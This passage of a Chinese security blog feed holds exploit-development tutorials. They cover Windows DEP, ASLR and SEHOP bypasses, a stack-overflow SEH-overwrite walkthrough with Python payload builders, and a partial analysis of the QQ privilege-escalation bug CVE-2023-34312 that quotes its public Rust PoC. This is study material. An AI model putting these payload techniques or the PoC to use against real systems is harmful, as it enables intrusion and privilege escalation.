class="string">b&quot;\x80&quot;</span>*<span class="number">4</span>    <span class="comment">#Shellcode Address</span></span><br><span class="line">payload += <span class="string">b&quot;\xff\x00\x00\x00&quot;</span>  <span class="comment">#Address Length</span></span><br><span class="line">payload += <span class="string">b&quot;\x40\x00\x00\x00&quot;</span>  <span class="comment">#PAGE_EXECUTE_READWRITE</span></span><br><span class="line">payload += <span class="string">b&quot;\x38\xa0\x41\x00&quot;</span>  <span class="comment">#0041A038</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a68c0c2af42ae0d17c84c82d9d2db5b0.png" alt="image-20230713195003967" /></p></li><li><p><code>VirtualAlloc</code>来开辟可执行的内存然后执行shellcode</p><p>和<code>VirtualProtect</code>一样的道理，不过需要使用复制的payload将shellcode复制到可执行的内存中</p></li></ul><h1 id="aslr"><a class="markdownIt-Anchor" href="#aslr"></a> ASLR</h1><p>在绕过DEP保护中需要调试的时候才能写入函数地址的原因就是这些函数的DLL使用了ASLR保护，导致函数每次加载的基地址不同，所以无法使用固定地址。</p><p>绕过思路主要有</p><ul><li>低位覆盖，最低位是固定的</li><li>堆喷，将内存初始化后的<code>\x0c</code>强制写为<code>\x90</code>（<code>nop</code>的汇编），这样程序进入了任意的地址都能滑行到shellcode。（扩大伤害面）</li></ul><h1 id="sehop"><a class="markdownIt-Anchor" href="#sehop"></a> SEHOP</h1><p>由于SEH是链式的，所以他会顺着链表检查，如果最后一个不为系统固定的终极异常处理函数就直接不执行。</p><p><img src="https://img.joe1sn.top/uploads/big/5319fbefe0a46939d4d853e4debc9e4f.png" alt="image-20230713201332561" /></p><p>最直接有效的就是伪造SEH链，由于只会验证最后一个，只满足这个条件就可以了</p><p>由于SEHOP在SafeSEH之前，所以绕过过后还需要继续绕过SafeSEH</p><p><img src="https://img.joe1sn.top/uploads/big/f99910e357fc63d939677ac967101038.png" alt="image-20230713201648035" /></p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p>《0day安全：软件漏洞分析技术》</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;针对栈攻击的防护与绕过&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】基础栈溢出利用</title>
    <link href="https://joe1sn.eu.org/2023/07/08/win-pwn-stack/"/>
    <id>https://joe1sn.eu.org/2023/07/08/win-pwn-stack/</id>
    <published>2023-07-08T08:39:36.000Z</published>
    <updated>2023-07-08T10:18:47.929Z</updated>
    
    <content type="html"><![CDATA[<p>[Win Pwn] 基础栈溢出利用</p><p>window下无保护的栈溢出加载shellcode</p><span id="more"></span><h1 id="程序"><a class="markdownIt-Anchor" href="#程序"></a> 程序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">vuln();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在windows下的防护等级有</p><ul><li><code>ASLR</code><ul><li><code>/DYNAMICBASE</code> 带有剥离的重定位条目边缘情况</li><li><code>/HIGHENTROPYVA</code> for 64-bit systems</li></ul></li><li><code>Code integrity/signing:</code><ul><li><code>/INTEGRITYCHECK</code></li><li>使用有效（可信、活动）证书进行 Authenticode 签名（Linux 目前不支持）</li></ul></li><li><code>DEP</code><ul><li>别称：<code>W^X</code>, <code>NX</code></li></ul></li><li><code>Manifest isolation</code><ul><li><code>/ALLOWISOLATION</code></li></ul></li><li><code>SEH</code>和<code>SafeEH</code><ul><li><code>SEH</code>=<code>Structured Exception Handling</code></li></ul></li><li><code>Control Flow Guard</code>和<code>Return Flow Guard instrumentation</code></li><li><code>Stack cookie</code><ul><li><code>/GS</code></li></ul></li></ul><ol><li><p>ASLR：与Linux的PIE相同，指地址随机化，将在程序启动时将DLL随机的加载到内存中的未知，自Windows 10开始已经在系统中被配置为默认启动；</p></li><li><p>High Entropy VA：高熵64位地址空间布局随机化，开启后标识此程序的随机化取值空间为64 bit，这会导致攻击者更难去推测随机化后的地址；</p></li><li><p>Force Integrity：强制签名保护，开启后标识程序加载时需要验证其中的前命，如果签名不正确，程序将会被阻止运行；</p></li><li><p>Isolation：隔离保护，开启后表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限；</p></li><li><p>NX/DEP/PAE：NX保护指的是内存页不可运行。属于系统级的内存保护功能，能够将一页或多页标记为不可执行，从而防止从该内存区域运行代码，以帮助防止利用缓冲区溢出。防止代码在数据页面（例如堆、栈和内存池）中运行，在Windows中常称为DEP。</p><p>PAE指物理地址拓展，PAE是一项处理器功能，使x86处理器可以在部分windows版本上访问4 GB以上的物理内存。在基于x86的系统上运行的某些32位版本的Windows Server可以使用PAE访问最多64 GB或128 GB的物理内存，具体取决于处理器的物理地址大小。使用PAE，操作系统将从两级线性地址转换为三级地址转换。两级线性地址转换将线性地址拆分为3个独立的字段索引到内存表中，三级地址转换将其拆分为4个独立的字段：一个2位字段，两个9位字段和一个12位字段。PAE模式下的页表条目(PTE)和页目录条目(PDE)的大小从32位增加到64位。附加位允许操作系统PTE或PDE引用4 GB以上的物理内存，同时PAE将允许在基于x86的系统上运行32位windows中启用DEP等功能。</p></li><li><p><code>SEHOP</code>：即结构化异常处理保护(structured Exception Handling Overwrite Protection)，这个保护能够防止攻击者利用结构化异常处理来进行进一步的利用。</p></li><li><p><code>CFG</code>：即控制流防护这项技术通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点，最终及时有效的进行异常处理，避免引发相关的安全问题。</p></li><li><p>RFG：即返回地址防护，在每个函数头部将返回地址保存到 <code>fs:[rsp](thread control stack)</code>，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止攻击；</p></li><li><p>SafeSEH：安全结构化异常处理(Safe Structured Exception Handlers)，白名单版的安全沙箱，定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行；</p></li><li><p>GS：类似于Linux中的Canary保护，开启后，会在返回地址和BP之前压入一个额外的 <code>Security Cookie</code>，系统会比较栈中的这个值和原先存放在 <code>.data</code>中的值做一个比较，如果两者不吻合，则说明发生了栈溢出；</p></li><li><p>Authenticode：签名保护；</p></li><li><p>.NET：DLL混淆级保护</p></li></ol><p>你可以查看文件头进行识别，也可以使用winchecksec进行识别</p><p><img src="https://img.joe1sn.top/uploads/big/325814dc1fa1572df0f97d5b7bd3ddfa.png" alt="image-20230707130719644" /></p><p>非常明显的漏洞点</p><h1 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h1><p>GCC编译<code>gcc .\main.c -o shellcode</code></p><p><img src="https://img.joe1sn.top/uploads/big/c55686928835d42421d7f6c0656f5cff.png" alt="image-20230707130122963" /></p><p>先试一下跳转，加上覆盖ebp的空间大小是<code>0x1c</code></p><p><img src="https://img.joe1sn.top/uploads/big/46eaa11d681dcd3c33a4b431e30b2c79.png" alt="image-20230707131904489" /></p><h1 id="加载shellcode"><a class="markdownIt-Anchor" href="#加载shellcode"></a> 加载shellcode</h1><p>现在想办法布置shellcode，由于没有后门函数所以需要利用SEH进行shellcode的布置。</p><p><strong>栈中的 SEH Handle 存储的形式</strong></p><p><img src="https://img.joe1sn.top/uploads/big/eb18a130a41aa85ce5a74b3ef1d61905.png" alt="img" /></p><p>基本的布置方式如下，实战的可以参考<a href="https://blog.joe1sn.top/2021/05/18/CVE-2019-9766/">CVE-2019-9766简单栈溢出</a></p><p><img src="https://img.joe1sn.top/uploads/big/8a8a4e2f63396305958ac9645adb7c9a.png" alt="img" /></p><p>使用<strong>x32dbg</strong>调试得到SEH链，然后得出payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*<span class="number">0x11c</span> <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xee\x19\x40\x00&quot;</span>    <span class="comment">#004019EE 00402537 004017EE</span></span><br><span class="line">nops = <span class="string">b&quot;\x90&quot;</span>*<span class="number">5</span>                <span class="comment">#nops</span></span><br><span class="line"></span><br><span class="line">payload = offset+NSEH+gadget+shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p>使用了gadget，进行两次pop抬栈，这样就能滑行到shellcode</p><p><img src="https://img.joe1sn.top/uploads/big/80de864faf1862d894461625d818fcb0.png" alt="image-20230708144240496" /></p><p>gadget过后的跳转</p><p><img src="https://img.joe1sn.top/uploads/big/4bdef43635c0608fb2dd1dce892a899c.png" alt="image-20230708144321174" /></p><p>但是shellcode长度有限制，所以很寄</p><p><img src="https://img.joe1sn.top/uploads/big/c2eae4db075ff3efe7d7addc866d586c.png" alt="img" /></p><p>但是我们执行一小段shellcode，那么可以尝试自己写gadget，将shellcode写入在payload前段，然后利用SEH到自己写的gadget，最后跳转到shellcode，需要注意的是程序会把第五位归0，所以要注意。</p><p>在使用<code>fscanf</code>函数读取字符串时，以下特殊字符可能会导致读取失败或产生意外的结果：</p><ol><li>空格 (<code>0x20</code>)</li><li>制表符 (<code>0x09</code>)</li><li>换行符 (<code>0x0A</code>)</li><li>回车符 (<code>0x0D</code>)</li></ol><p>这块儿就只有自己根据实际情况改进shellcode了。</p><p>那么我稍微改进一下源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">vuln();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于栈比较小，可以考虑自己写入gadget来帮助shellcode的跳转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x11c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">16</span>) <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xee\x19\x40\x00&quot;</span>    <span class="comment">#004019EE 00402537 004017EE</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x14\x06\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">                                                        <span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">16</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/84688c248714ebea01d6ca5d019c7bb4.gif" alt="img" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[Win Pwn] 基础栈溢出利用&lt;/p&gt;
&lt;p&gt;window下无保护的栈溢出加载shellcode&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】CVE-2023-34312分析</title>
    <link href="https://joe1sn.eu.org/2023/07/03/qq-evasion/"/>
    <id>https://joe1sn.eu.org/2023/07/03/qq-evasion/</id>
    <published>2023-07-03T12:13:39.000Z</published>
    <updated>2023-07-18T01:32:15.629Z</updated>
    
    <content type="html"><![CDATA[<p>关于QQ提权漏洞CVE-2023-34312的分析</p><p>！！未完待续！！</p><span id="more"></span><h1 id="poc分析"><a class="markdownIt-Anchor" href="#poc分析"></a> PoC分析</h1><p>PoC地址：<a href="https://github.com/vi3t1/qq-tim-elevation%EF%BC%8C%E7%94%A8rust%E5%86%99%E7%9A%84%E6%8C%89%E7%85%A7%E6%95%99%E7%A8%8B%E7%BC%96%E8%AF%91%E5%A5%BD%E4%BA%86%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%89%93%E4%BA%86">https://github.com/vi3t1/qq-tim-elevation，用rust写的按照教程编译好了就可以直接打了</a></p><p>由于没有开启ASLR保护所以很稳</p><p><img src="D:%5CPictures%5Ctypora%5Cpsc.jpg" alt="psc" /></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703201740757.png" alt="image-20230703201740757" /></p><p>接着是分析一下PoC</p><h2 id="触发"><a class="markdownIt-Anchor" href="#触发"></a> 触发</h2><p>触发方式是<code>.\QQProtect .\evil.dll</code>，同时必须保持<code>tinyxml.dll</code>在同一目录下，这里用QQ9.7.7举例子。</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703202240244.png" alt="image-20230703202240244" /></p><p>首先是<a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinew"><code>GetCommandLineW</code></a>获得启动参数，接着判断置否存在下列关键参数，然后不存在关键参数直接到了<code>StartAddress</code></p><p>使用<code>QQProtectEngine.dll</code>中的<code>RunQQProtect</code>，设置回调函数<code>sub_40C950</code></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703203114437.png" alt="image-20230703203114437" /></p><p>回调函数中的<code>a2</code>指针可以将任何地址的值设置为参数分析时的参数个数值，也就是 <strong>1</strong>。</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703203402262.png" alt="image-20230703203402262" /></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703211606183.png" alt="image-20230703211606183" /></p><p>那么现在我们就有了将任意地址写为1的能力，恰好<code>QQProtect.exe</code>没有开启<code>ASLR</code>保护，若开启的话下图应该存在<code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE </code></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703204248679.png" alt="image-20230703204248679" /></p><h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> PoC</h2><p>和上文中结合起来，在<code>QQProtect</code>中导入了<code>tinyxml.dll</code>，所以可以修改这个dll的内容来执行攻击。</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230704082005386.png" alt="image-20230704082005386" /></p><ul><li><p>PoC首先获取了<code>evil.dll</code>的路径，</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">evil_dllpath</span>: <span class="type">String</span> = std::env::<span class="title function_ invoke__">args</span>().<span class="title function_ invoke__">nth</span>(<span class="number">1</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="keyword">let</span> <span class="variable">evil_dllpath</span>: std::path::PathBuf = std::path::Path::<span class="title function_ invoke__">new</span>(&amp;evil_dllpath).<span class="title function_ invoke__">canonicalize</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;evil dll: &#123;&#125;&quot;</span>, evil_dllpath.<span class="title function_ invoke__">display</span>());</span><br></pre></td></tr></table></figure><p>接着打开服务获得<code>QQProtectEngine.dll</code>的基地址（因为他开启了ASLR保护）。<br /><img src="D:%5CPictures%5Ctypora%5Cimage-20230704082356731.png" alt="image-20230704082356731" /><br />在PoC中打开了Windows的<code>QPCore</code>服务然后获取配置信息，从配置信息中提取出<code>qqprotect.exe</code>和<code>QQProtectEngine.dll</code>的路径。<br />由于<code>LoadLibraryExW</code>中使用了<code>DONT_RESOLVE_DLL_REFERENCES</code>所以不会调用DLLMain，若函数成功，则返回值是已加载模块的句柄，从句柄的第一个值提取出加载的地址。注意的是，这里是首先加载<code>tinyxml.dll</code>，所以加载的<code>QQProtectEngine.dll</code>的地址在这里同一样适用，这样就获得了<code>QQProtectEngine.dll</code>的基地址。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">get_qqprotectengine_dllbase</span>() <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">manager</span> = ServiceManager::<span class="title function_ invoke__">local_computer</span>(None::&lt;&amp;<span class="type">str</span>&gt;, ServiceManagerAccess::ENUMERATE_SERVICE).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">service</span> = manager.<span class="title function_ invoke__">open_service</span>(<span class="string">&quot;QPCore&quot;</span>, ServiceAccess::QUERY_CONFIG).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">service_config</span> = service.<span class="title function_ invoke__">query_config</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qqprotect_exe</span> = windows_args::ArgsOs::<span class="title function_ invoke__">parse_cmd</span>(service_config.executable_path.<span class="title function_ invoke__">as_os_str</span>()).<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qqprotectengine_dll</span> = std::path::Path::<span class="title function_ invoke__">new</span>(&amp;qqprotect_exe).<span class="title function_ invoke__">parent</span>().<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">join</span>(<span class="string">&quot;QQProtectEngine.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">h</span> = <span class="title function_ invoke__">LoadLibraryExW</span>(<span class="title function_ invoke__">PCWSTR</span>(HSTRING::<span class="title function_ invoke__">from</span>(qqprotectengine_dll.<span class="title function_ invoke__">as_path</span>()).<span class="title function_ invoke__">as_ptr</span>()), HANDLE::<span class="title function_ invoke__">default</span>(), DONT_RESOLVE_DLL_REFERENCES).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">base</span> = h.<span class="number">0</span> <span class="keyword">as</span> <span class="type">u32</span>;</span><br><span class="line">        <span class="title function_ invoke__">FreeLibrary</span>(h);</span><br><span class="line">        <span class="keyword">return</span> base;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>创建IPC进程间通讯</p><p>如何找到IPC通讯，可以在<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist%E5%AE%89%E8%A3%85%60pipelist%60%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%9A%84%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E9%80%9A%E8%AE%AF">https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist安装`pipelist`查看所有的命名管道通讯</a></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716221331756.png" alt="image-20230716221331756" /></p><p>那么在<code>QQProtect.exe</code>一定会有一个连接命名管道的地方，在<code>QQProtectEnginee.dll</code>中使用</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716230155905.png" alt="image-20230716230155905" /></p><p>找到对应的管道命名</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716230225143.png" alt="image-20230716230225143" /></p><p>和</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716232640237.png" alt="image-20230716232640237" /></p><p>（回调分析麻了）之后会进入QSection.dll中的函数，具体逆向可以看B战大佬的视频：<a href="https://www.bilibili.com/video/BV1wm4y1E7TL">https://www.bilibili.com/video/BV1wm4y1E7TL</a></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230717091525707.png" alt="image-20230717091525707" /></p><p>很像一个结构体。加载了<code>QPSection</code>后调用了6号导出函数，之后还需要对结构体进行逆向</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于QQ提权漏洞CVE-2023-34312的分析&lt;/p&gt;
&lt;p&gt;！！未完待续！！&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
